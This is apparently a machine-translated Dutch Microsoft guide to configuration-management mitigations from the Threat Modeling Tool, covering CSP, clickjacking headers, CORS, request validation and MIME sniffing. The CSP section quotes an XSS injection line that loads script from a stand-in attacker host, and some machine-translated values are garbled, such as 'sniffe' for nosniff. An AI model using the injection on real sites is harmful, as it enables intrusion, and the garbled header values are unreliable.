---
title: Configuratie beheer voor de Microsoft Threat Modeling Tool
titleSuffix: Azure
description: Meer informatie over configuratie beheer voor de Threat Modeling Tool. Zie informatie over risico beperking en voor beelden van code weer geven.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: f28ebb95ae9aaaff3f87d8388a09b41e0b3445b5
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 03/29/2021
ms.locfileid: "94517481"
---
# <a name="security-frame-configuration-management--mitigations"></a>Beveiligings frame: configuratie beheer | Oplossingen 
| Product/service | Artikel |
| --------------- | ------- |
| **Webtoepassing** | <ul><li>[Implementeer beveiligings beleid voor inhoud (CSP) en schakel inline java script uit](#csp-js)</li><li>[XSS-filter van browser inschakelen](#xss-filter)</li><li>[ASP.NET-toepassingen moeten tracering en fout opsporing uitschakelen vóór de implementatie](#trace-deploy)</li><li>[Toegang tot Java script van derden alleen vanuit vertrouwde bronnen](#js-trusted)</li><li>[Zorg ervoor dat geverifieerde ASP.NET-pagina's in de gebruikers interface zijn opgenomen of klik op verdedigings linie](#ui-defenses)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op ASP.NET-webtoepassingen](#cors-aspnet)</li><li>[Het kenmerk ValidateRequest op ASP.NET-pagina's inschakelen](#validate-aspnet)</li><li>[Nieuwste versies van Java script-bibliotheken gebruiken die lokaal worden gehost](#local-js)</li><li>[Automatische MIME-sniffing uitschakelen](#mime-sniff)</li><li>[Standaard server headers op Windows Azure websites verwijderen om te voor komen dat er wordt gevingerafdrukd](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Een Windows Firewall configureren voor toegang tot de data base-engine](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-Web-API](#cors-api)</li><li>[Secties met de configuratie bestanden van de Web-API versleutelen die gevoelige gegevens bevatten](#config-sensitive)</li></ul> |
| **IoT-apparaat** | <ul><li>[Zorg ervoor dat alle beheer interfaces zijn beveiligd met sterke referenties](#admin-strong)</li><li>[Ervoor zorgen dat onbekende code niet kan worden uitgevoerd op apparaten](#unknown-exe)</li><li>[Versleutelen van het besturings systeem en extra partities van IoT-apparaten met de bits-kluis](#partition-iot)</li><li>[Zorg ervoor dat alleen de minimale Services/functies zijn ingeschakeld op apparaten](#min-enable)</li></ul> |
| **IoT-veld Gateway** | <ul><li>[Versleutelen van besturings systeem en extra partities van IoT-veld Gateway met een bit-kluis](#field-bit-locker)</li><li>[Zorg ervoor dat de standaard aanmeldings referenties van de veld Gateway tijdens de installatie worden gewijzigd](#default-change)</li></ul> |
| **IoT-Cloud gateway** | <ul><li>[Zorg ervoor dat de Cloud gateway een proces implementeert om ervoor te zorgen dat de firmware van de aangesloten apparaten up-to-date is](#cloud-firmware)</li></ul> |
| **Grens van computer vertrouwen** | <ul><li>[Zorg ervoor dat het beveiligings beheer voor apparaten op het eind punt is geconfigureerd volgens het beleid van de organisatie](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Veilig beheer van toegangs sleutels voor Azure Storage garanderen](#secure-keys)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld in azure Storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[De functie voor het beperken van WCF-service inschakelen](#throttling)</li><li>[Informatie over het vrijgeven van WCF via meta gegevens](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementeer beveiligings beleid voor inhoud (CSP) en schakel inline java script uit

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Een inleiding tot het beveiligings beleid voor](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)inhoud, [referentie voor inhouds beveiligings beleid](https://content-security-policy.com/), [beveiligings functies](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Inleiding tot het BEVEILIGINGS beleid voor inhoud](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [kan ik CSP gebruiken?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Stappen** | <p>Content Security Policy (CSP) is een ingrijpende beveiligings mechanisme, een W3C-standaard, waarmee eigen aren van webtoepassingen controle kunnen hebben over de inhoud die is inge sloten in hun site. CSP wordt toegevoegd als een HTTP-antwoord header op de webserver en wordt afgedwongen aan de client zijde door browsers. Het is een beleid dat is toegestaan op basis van een lijst: een website kan een set vertrouwde domeinen declareren op basis waarvan actieve inhoud, zoals Java script, kan worden geladen.</p><p>CSP biedt de volgende beveiligings voordelen:</p><ul><li>**Beveiliging tegen XSS:** Als een pagina kwetsbaar is voor XSS, kan een aanvaller deze op twee manieren benutten:<ul><li>Injecteren `<script>malicious code</script>` . Deze Cracking werkt niet als gevolg van de basis beperking van CSP-1</li><li>Injecteren `<script src="http://attacker.com/maliciousCode.js"/>` . Deze Cracking werkt niet omdat het domein dat door een aanvaller wordt beheerd, zich niet in de lijst met toegestane domeinen van de CSP bevindt</li></ul></li><li>**Controle over gegevens exfiltration:** Als schadelijke inhoud op een webpagina verbinding probeert te maken met een externe website en gegevens stelen, wordt de verbinding door de CSP afgebroken. Dit komt doordat het doel domein zich niet in de lijst met toegestane CSP'S bevindt</li><li>**Bescherming tegen klik-en-werking:** klik-en-authenticatie is een aanvals techniek waarbij een kwaadwillende persoon een legitieme website kan inzien en gebruikers kan dwingen om op UI-elementen te klikken. Momenteel wordt een verdedigings linie tegen klik-en-aansluitingen gerealiseerd door een antwoord header te configureren-X-frame-opties. Niet alle browsers respecteren deze header en de volgende keer dat CSP wordt doorgestuurd, is een standaard manier om te beschermen tegen klik-en-stekers</li><li>**Aanval in realtime:** Als er sprake is van een injectie aanval op een CSP-ingeschakelde website, wordt door browsers automatisch een melding geactiveerd naar een eind punt dat is geconfigureerd op de webserver. Op deze manier fungeert CSP als een real-time systeem voor waarschuwingen.</li></ul> |

### <a name="example"></a>Voorbeeld
Voorbeeld beleid: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Met dit beleid kunnen scripts alleen worden geladen van de server van de webtoepassing en Google Analytics server. Scripts die worden geladen vanuit een andere site, worden geweigerd. Wanneer CSP is ingeschakeld op een website, worden de volgende functies automatisch uitgeschakeld om XSS-aanvallen te beperken. 

### <a name="example"></a>Voorbeeld
Inline scripts worden niet uitgevoerd. Hier volgen enkele voor beelden van inline-scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Voorbeeld
Teken reeksen worden niet geëvalueerd als code. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>XSS-filter van browser inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [XSS-beveiligings filter](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Stappen** | <p>Configuratie van de reactie header van de X-XSS-beveiliging bepaalt het script filter voor meerdere sites van de browser. Deze antwoord header kan de volgende waarden hebben:</p><ul><li>`0:` Hiermee wordt het filter uitgeschakeld</li><li>`1: Filter enabled` Als er een aanval op cross-site scripting wordt gedetecteerd, wordt de pagina door de browser opschoont, zodat de aanval kan worden gestopt</li><li>`1: mode=block : Filter enabled`. In plaats van de pagina op te schonen wanneer een XSS-aanval wordt gedetecteerd, kan de browser de pagina niet weer geven</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. De pagina opschonen van de browser en de schending melden.</li></ul><p>Dit is een chroom functie die gebruikmaakt van CSP-schendings rapporten om details naar een door u gewenste URI te verzenden. De laatste twee opties worden beschouwd als veilige waarden.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET-toepassingen moeten tracering en fout opsporing uitschakelen vóór de implementatie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | Overzicht van [ASP.net-fout opsporing](/previous-versions/ms227556(v=vs.140)), [overzicht van ASP.net tracering](/previous-versions/bb386420(v=vs.140)), [procedures: tracering inschakelen voor een ASP.NET-toepassing](/previous-versions/0x5wc973(v=vs.140)), [How to: fout opsporing voor ASP.NET-toepassingen inschakelen](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Stappen** | Wanneer tracering is ingeschakeld voor de pagina, verkrijgt elke browser die de aanvraag aanvraagt ook de tracerings informatie die gegevens bevat over de interne server status en-werk stroom. Deze informatie kan gevoelig zijn voor beveiliging. Als fout opsporing is ingeschakeld voor de pagina, hebben fouten die zich voordoen op de server tot gevolg dat er een volledige stack-tracerings gegevens aan de browser worden gepresenteerd. Deze gegevens kunnen beveiligings gevoelige informatie over de werk stroom van de server bloot stellen. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Toegang tot Java script van derden alleen vanuit vertrouwde bronnen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | alleen vanuit vertrouwde bronnen wordt verwezen naar Java script van derden. De referentie-eind punten moeten altijd op TLS zijn. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Zorg ervoor dat geverifieerde ASP.NET-pagina's in de gebruikers interface zijn opgenomen of klik op verdedigings linie

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [OWASP Klik-Jack Cheat-werk blad](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), de [interne beveiliging van IE-gevechten Klik-Jack, met X-frame-opties](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Stappen** | <p>Klik op Jack, ook wel bekend als ' UI-aanval ', wanneer een aanvaller meerdere transparante of ondoorzichtige lagen gebruikt om een gebruiker te laten klikken op een knop of koppeling op een andere pagina wanneer deze op de pagina op het hoogste niveau is geklikt.</p><p>Deze laag wordt bereikt door een schadelijke pagina te bewerken met een IFRAME, waarmee de pagina van het slacht offer wordt geladen. Daarom is de aanvaller in staat om te klikken op de pagina en deze te routeren naar een andere pagina. Dit is waarschijnlijk het eigendom van een andere toepassing, domein of beide. Als u wilt voor komen dat er op aanvallen wordt geklikt, stelt u de juiste X-frame-opties HTTP-antwoord headers in die aangeven dat de browser geen frames van andere domeinen mag toestaan</p>|

### <a name="example"></a>Voorbeeld
De header X-FRAME-OPTIONS kan worden ingesteld via IIS web.config. Web.config code fragment voor sites die nooit mogen worden geframed: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Voorbeeld
Web.config code voor sites die alleen op pagina's in hetzelfde domein moeten worden geframed: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op ASP.NET-webtoepassingen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking wordt hetzelfde-Origin-beleid genoemd en voor komt dat een schadelijke site gevoelige gegevens van een andere site leest. Soms moet het echter nodig zijn om Api's veilig zichtbaar te maken die andere sites kunnen gebruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server hetzelfde-Origin-beleid kan versoepelen. Door CORS te gebruiken, kan een server bepaalde cross-Origin-aanvragen expliciet toestaan tijdens het afwijzen van andere.</p><p>CORS is veiliger en flexibeler dan eerdere technieken, zoals JSONP. Op basis van de kern wordt het inschakelen van CORS omgezet in het toevoegen van een paar HTTP-antwoord headers (Access-Control-*) aan de webtoepassing. Dit kan op verschillende manieren worden uitgevoerd.</p>|

### <a name="example"></a>Voorbeeld
Als toegang tot Web.config beschikbaar is, kan CORS worden toegevoegd via de volgende code: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Voorbeeld
Als toegang tot web.config niet beschikbaar is, kan CORS worden geconfigureerd door de volgende CSharp-code toe te voegen: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Het is belang rijk om ervoor te zorgen dat de lijst met oorsprongen in het kenmerk ' toegangs beheer-allow-Origin ' is ingesteld op een eindige en vertrouwde set oorsprong. Als deze niet op de juiste wijze wordt geconfigureerd (bijvoorbeeld door het instellen van de waarde als ' * '), kunnen kwaadwillende sites cross-Origin-aanvragen naar de webtoepassing >zonder enige beperkingen, waardoor de toepassing kwetsbaar is voor CSRF-aanvallen. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Het kenmerk ValidateRequest op ASP.NET-pagina's inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Validatie aanvragen-script aanvallen voor komen](https://www.asp.net/whitepapers/request-validation) |
| **Stappen** | <p>Validatie aanvragen, een functie van ASP.NET sinds versie 1,1, voor komt dat de server inhoud accepteert met niet-versleutelde HTML. Deze functie is ontworpen om te voor komen dat aanvallen met scripts worden door gegeven, waarbij client script code of HTML onbewust kan worden verzonden naar een server, wordt opgeslagen en vervolgens aan andere gebruikers wordt gepresenteerd. We raden u echter ten zeerste aan alle invoer gegevens en HTML-code ring te valideren wanneer dat nodig is.</p><p>Validatie van aanvragen wordt uitgevoerd door alle invoer gegevens te vergelijken met een lijst met mogelijk gevaarlijke waarden. Als er een overeenkomst wordt gevonden, wordt een door ASP.NET gegenereerd `HttpRequestValidationException` . Standaard is de functie voor het valideren van aanvragen ingeschakeld.</p>|

### <a name="example"></a>Voorbeeld
Deze functie kan echter worden uitgeschakeld op pagina niveau: 
```XML
<%@ Page validateRequest="false" %> 
```
of op toepassings niveau 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
De functie voor het valideren van aanvragen wordt niet ondersteund en maakt geen deel uit van de MVC6-pijp lijn. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Nieuwste versies van Java script-bibliotheken gebruiken die lokaal worden gehost

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | N.v.t.  |
| **Stappen** | <p>Ontwikkel aars die standaard Java script-bibliotheken gebruiken, zoals JQuery, moeten goedgekeurde versies van algemene Java script-bibliotheken gebruiken die geen bekende beveiligings fouten bevatten. Het is een goed idee om de meest recente versie van de bibliotheken te gebruiken, omdat deze beveiligings oplossingen bevatten voor bekende beveiligings problemen in hun oudere versies.</p><p>Als de meest recente versie niet kan worden gebruikt om de oorzaak van de compatibiliteit, moeten de onderstaande minimum versies worden gebruikt.</p><p>Aanvaard bare minimum versies:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery validate 1,9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET en Ajax**<ul><li>Webformulieren en Ajax 4 van ASP.NET</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Een Java script-bibliotheek nooit laden vanaf externe sites zoals open bare Cdn's</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Automatische MIME-sniffing uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Beveiligings deel van IE8 V: uitgebreide beveiliging](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME-type](https://en.wikipedia.org/wiki/Mime_type) |
| **Stappen** | De X-content-type-Options-header is een HTTP-header waarmee ontwikkel aars kunnen opgeven dat hun inhoud niet MIME-sniffing mag zijn. Deze header is ontworpen om MIME-Sniffing-aanvallen te verhelpen. Voor elke pagina die door de gebruiker te raden inhoud kan bevatten, moet u de HTTP-header X-content-type-Options: sniffe gebruiken. Als u de vereiste header globaal wilt inschakelen voor alle pagina's in de toepassing, kunt u een van de volgende handelingen uitvoeren:|

### <a name="example"></a>Voorbeeld
Voeg de header in het web.config-bestand toe als de toepassing wordt gehost door Internet Information Services (IIS) 7 en hoger. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Voorbeeld
Voeg de header toe via de BeginRequest van de globale toepassing \_ 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Voorbeeld
Aangepaste HTTP-module implementeren 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Voorbeeld
U kunt de vereiste header alleen voor specifieke pagina's inschakelen door deze toe te voegen aan afzonderlijke antwoorden: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Standaard server headers op Windows Azure websites verwijderen om te voor komen dat er wordt gevingerafdrukd

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | EnvironmentType-Azure |
| **Referenties**              | [Standaard server headers op Windows Azure websites verwijderen](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Stappen** | Kopteksten zoals server, X-by, X-AspNet-version tonen informatie over de-server en de onderliggende technologieën. Het wordt aanbevolen deze headers te onderdrukken om te voor komen dat de toepassing wordt gevingerafdrukd |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Een Windows Firewall configureren voor toegang tot de data base-engine

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Database | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | SQL Azure, premises |
| **Kenmerken**              | N.v.t., SQL-versie-V12 |
| **Referenties**              | [Een Azure SQL database firewall configureren](../../azure-sql/database/firewall-configure.md), [een Windows Firewall configureren voor toegang tot de data base-engine](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Stappen** | Firewallsystemen helpen onbevoegde toegang tot computerresources te voorkomen. Als u via een firewall toegang wilt krijgen tot een exemplaar van de SQL Server data base-engine, moet u de firewall configureren op de computer met SQL Server om toegang toe te staan |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-Web-API

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | MVC 5 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | Het [inschakelen van cross-Origin-aanvragen in ASP.net Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.net Web API-CORS-ondersteuning in ASP.net Web API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Stappen** | <p>Browserbeveiliging voorkomt dat een webpagina AJAX-aanvragen indient bij een ander domein. Deze beperking wordt hetzelfde-Origin-beleid genoemd en voor komt dat een schadelijke site gevoelige gegevens van een andere site leest. Soms moet het echter nodig zijn om Api's veilig zichtbaar te maken die andere sites kunnen gebruiken. Cross Origin Resource Sharing (CORS) is een W3C-standaard waarmee een server hetzelfde-Origin-beleid kan versoepelen.</p><p>Door CORS te gebruiken, kan een server bepaalde cross-Origin-aanvragen expliciet toestaan tijdens het afwijzen van andere. CORS is veiliger en flexibeler dan eerdere technieken, zoals JSONP.</p>|

### <a name="example"></a>Voorbeeld
Voeg in de App_Start/WebApiConfig.cs de volgende code toe aan de methode WebApiConfig. REGI ster 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Voorbeeld
Het kenmerk EnableCors kan als volgt worden toegepast op actie methoden in een controller: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Houd er rekening mee dat het belang rijk is om ervoor te zorgen dat de lijst met oorsprongen in het kenmerk EnableCors is ingesteld op een eindige en vertrouwde reeks oorsprong. Als deze niet op de juiste wijze wordt geconfigureerd (bijvoorbeeld door de waarde als ' * ') in te stellen, kunnen kwaadwillende sites cross-Origin-aanvragen naar de API activeren zonder enige beperking, >daardoor de API kwetsbaar maakt voor CSRF-aanvallen. EnableCors kan op controller niveau worden gedecoreerd. 

### <a name="example"></a>Voorbeeld
Als u CORS wilt uitschakelen voor een bepaalde methode in een klasse, kunt u het kenmerk DisableCors gebruiken, zoals hieronder wordt weer gegeven: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Build |  
| **Toepasselijke technologieën** | MVC 6 |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Het inschakelen van cross-Origin-aanvragen (CORS) in ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
| **Stappen** | <p>In ASP.NET Core 1,0 kan CORS worden ingeschakeld met behulp van middleware of met MVC. Wanneer u MVC gebruikt om CORS in te scha kelen, worden dezelfde CORS-Services gebruikt, maar de middleware van CORS is niet.</p>|

**Benadering-1** Inschakelen van CORS met middleware: als u CORS wilt inschakelen voor de volledige toepassing, voegt u de CORS-middleware toe aan de aanvraag pijplijn met behulp van de extensie methode UseCors. Er kan een cross-Origin-beleid worden opgegeven bij het toevoegen van het CORS-middleware met behulp van de CorsPolicyBuilder-klasse. Er zijn twee manieren om dit te doen:

### <a name="example"></a>Voorbeeld
De eerste is om UseCors aan te roepen met een Lambda. De Lambda neemt een CorsPolicyBuilder-object op: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Voorbeeld
De tweede is het definiëren van een of meer benoemde CORS-beleids regels, en selecteer vervolgens het beleid op naam tijdens runtime. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Benadering-2** Inschakelen van CORS in MVC: ontwikkel aars kunnen ook MVC gebruiken om specifieke CORS per actie, per controller of globaal toe te passen voor alle controllers.

### <a name="example"></a>Voorbeeld
Per actie: als u een CORS-beleid voor een specifieke actie wilt opgeven, voegt u het kenmerk [EnableCors] toe aan de actie. Geef de naam van het beleid op. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Voorbeeld
Per controller: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Voorbeeld
Globally 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Houd er rekening mee dat het belang rijk is om ervoor te zorgen dat de lijst met oorsprongen in het kenmerk EnableCors is ingesteld op een eindige en vertrouwde reeks oorsprong. Als deze niet op de juiste wijze wordt geconfigureerd (bijvoorbeeld door de waarde als ' * ') in te stellen, kunnen kwaadwillende sites cross-Origin-aanvragen naar de API activeren zonder enige beperking, >daardoor de API kwetsbaar maakt voor CSRF-aanvallen. 

### <a name="example"></a>Voorbeeld
Als u CORS wilt uitschakelen voor een controller of actie, gebruikt u het kenmerk [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Secties met de configuratie bestanden van de Web-API versleutelen die gevoelige gegevens bevatten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Implementatie |  
| **Toepasselijke technologieën** | Algemeen |
| **Kenmerken**              | N.v.t.  |
| **Referenties**              | [Procedure: Configuratie secties versleutelen in ASP.NET 2,0 met behulp van DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [een beveiligde configuratie provider opgeven](/previous-versions/68ze1hb2(v=vs.140)) [met behulp van Azure Key Vault om toepassings geheimen te beveiligen](/azure/architecture/multitenant-identity/web-api) |
